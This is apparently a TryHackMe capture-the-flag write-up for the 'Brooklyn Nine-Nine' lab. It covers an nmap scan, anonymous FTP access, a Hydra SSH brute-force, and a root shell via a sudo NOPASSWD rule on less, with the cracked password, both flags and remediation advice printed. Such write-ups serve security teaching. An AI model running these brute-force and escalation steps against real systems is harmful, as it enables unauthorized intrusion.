@@ -1,0 +1,115 @@
+Brooklyn Nine-Nine — TryHackMe Writeup
+Room Info
+* Platform: TryHackMe
+* Room: Brooklyn Nine-Nine
+* Difficulty: Easy
+* Tags: Security, Brute-force, Privilege Escalation
+
+Reconnaissance
+Port Scanning
+bash
+
+nmap -sC -sV -oN nmap.txt 10.10.x.x
+Results:
+
+Port	State	Service	Version
+21	open	FTP	vsftpd 3.0.3
+22	open	SSH	OpenSSH 7.6p1
+80	open	HTTP	Apache httpd 2.4.29
+Enumeration
+FTP — Port 21
+Anonymous login is enabled. Connecting with default credentials:
+bash
+
+ftp 10.10.x.x
+
+Name: anonymousPassword: anonymous
+bash
+
+ftp> ls-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txtftp> get note_to_jake.txtftp> bye
+Reading the note:
+bash
+
+cat note_to_jake.txt
+Content:
+
+From Amy:Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine!
+Key Finding: User jake has a weak password.
+
+Initial Access
+Brute-forcing SSH
+Using Hydra with rockyou wordlist:
+bash
+
+hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.x.x -t 4
+Result:
+
+[22][ssh] host: 10.10.x.x   login: jake   password: 987654321
+SSH Connection
+bash
+
+ssh jake@10.10.x.x
+Password: 987654321
+
+User Flag
+Exploring home directories:
+bash
+
+jake@brookly_nine_nine:~$ ls /homeamy  holt  jakejake@brookly_nine_nine:~$ cat /home/holt/user.txtee11cbb19052e40b07aac0ca060c23ee
+User Flag: ee11cbb19052e40b07aac0ca060c23ee
+
+Privilege Escalation
+Checking Sudo Permissions
+bash
+
+jake@brookly_nine_nine:~$ sudo -l
+Output:
+
+Matching Defaults entries for jake on brookly_nine_nine:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser jake may run the following commands on brookly_nine_nine:    (ALL) NOPASSWD: /usr/bin/less
+Jake can run /usr/bin/less as root without a password.
+Exploiting less
+Method 1 — Read root flag directly:
+bash
+
+sudo less /root/root.txt
+Method 2 — Spawn root shell:
+bash
+
+sudo less /etc/profile
+Then type:
+
+!/bin/bash
+This spawns a root shell.
+Reference: GTFOBins - less
+
+Root Flag
+bash
+
+less /root/root.txt
+Root Flag: 63a9f0ea7bb98050796b649e85481845
+
+Summary
+
+Step	Action	Result
+1	Nmap scan	Found ports 21, 22, 80
+2	FTP anonymous login	Found note about jake's weak password
+3	Hydra brute-force	Credentials: jake:987654321
+4	SSH login	Initial access as jake
+5	Enumerate home dirs	User flag in /home/holt/user.txt
+6	sudo -l	Found less with NOPASSWD
+7	GTFOBins exploit	Root flag via sudo less
+Vulnerabilities Identified
+
+Vulnerability	Risk	Remediation
+FTP Anonymous Access	Medium	Disable anonymous login in vsftpd.conf
+Weak Password	High	Enforce strong password policy
+Sudo Misconfiguration	Critical	Remove NOPASSWD for file readers
+Tools Used
+* nmap — Network scanning
+* ftp — File transfer protocol client
+* hydra — Password brute-forcing
+* ssh — Secure shell connection
+
+References
+* GTFOBins
+* TryHackMe
